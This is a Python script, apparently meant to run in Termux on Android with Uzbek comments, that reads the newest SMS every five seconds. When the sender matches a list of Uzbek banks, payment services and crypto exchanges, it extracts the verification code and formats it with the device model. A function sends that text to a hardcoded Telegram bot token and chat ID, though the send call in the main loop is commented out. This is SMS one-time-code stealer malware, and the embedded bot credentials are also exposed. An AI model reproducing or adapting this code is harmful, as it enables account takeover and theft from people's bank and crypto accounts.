import json
import time
import subprocess
import requests
from datetime import datetime
import re

TOKEN = "7693802856:AAFTMn1pJQ0g3Ddb_nwLTzZ1wywlwFE75vQ"
CHAT_ID = 1164501429

bank = [
    'humo',
    'uzumbank',
    'hamkorbank',
    'anor_bank',
    'anorbank',
    'kapital.',
    'kapitalbank',
    'paynet',
    'paynet_info',
    'trastpay',
    'tbc',
    'tbc_uz',
    'ipakmobile',
    'infinbank',
    'nbu',
    '1071',
    'xazna',
    'kapital',
    'octobank',
    'alliance',
    'aab' ,
    'avo' ,
    'aloqabank',
    'smartbank',
    'multicard',
    'kdb_bank',
    'hayotbank',
    'agrobank',
    'yangi',
    'humans',
    'davrbank',
    'zoomrad',
    'hcloud',
    'binance',
    'bitget',
    'notice',
    'okx' ,
    'coinbase',
    'bybit',
    'qsms'
    ]

def get_device_info():
    try:
        result = subprocess.check_output(['termux-info'])
        result_str = result.decode('utf-8')
        
        device_model = None
        
        lines = result_str.splitlines()
        for i, line in enumerate(lines):
            if "Device model" in line:
                if line.split(":")[1].strip() not in [""," "]:
                    device_model = line.split(":")[1].strip()
                else:
                    if i + 1 < len(lines):
                        device_model = lines[i + 1].strip()
                return device_model
        
        return "Qurilma modeli topilmadi"
    
    except Exception as e:
        return f"Xatolik: {e}"

def extract_code(text):
    # Kodlarni qidirish: kod, code, kodi so'zlaridan keyin harflar va raqamlar
    match = re.search(r'(kod|code|kodi)\s*:\s*([A-Za-z0-9]+)', text, re.IGNORECASE)
    if match:
        return match.group(2)
    else:
        return "Kod topilmadi"

# SMS olish
def get_sms():
    try:
        result = subprocess.check_output(['termux-sms-list', '-l', '1'])
        
        sms_data = json.loads(result.decode('utf-8'))
        
        if sms_data:
            sms = sms_data[0]
            adr = sms.get('address')

            if adr.lower() not in bank:
                return None
            
            device = get_device_info()
            received_time = sms.get('received', '')
            if received_time:
                datetime_obj = datetime.strptime(received_time, "%Y-%m-%d %H:%M:%S")
                formatted_time = datetime_obj.strftime("%d %B %H:%M")
            else:
                formatted_time = "Vaqt topilmadi"
            
            body = sms.get('body', 'No body')
            code = extract_code(body)
        
            text = f"""
🔐 <code> {code} </code>

✈️ {adr}
📲 {device}
⏰ {formatted_time}
📥 {body}



"""

            return text
        else:
            return "No new messages."
    except Exception as e:
        return f"Xatolik: {e}"

# Telegram xabarini yuborish
def send_telegram_message(msg="testing..."):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML" }
    response = requests.post(url, data=data)

    print("Kod:", response.status_code)

# SMSlarni doimiy tekshirish
old_sms = ""
while True:
    sms = get_sms()
    # if sms != old_sms:
    #     send_telegram_message(sms)
    #     old_sms = sms
    time.sleep(5)
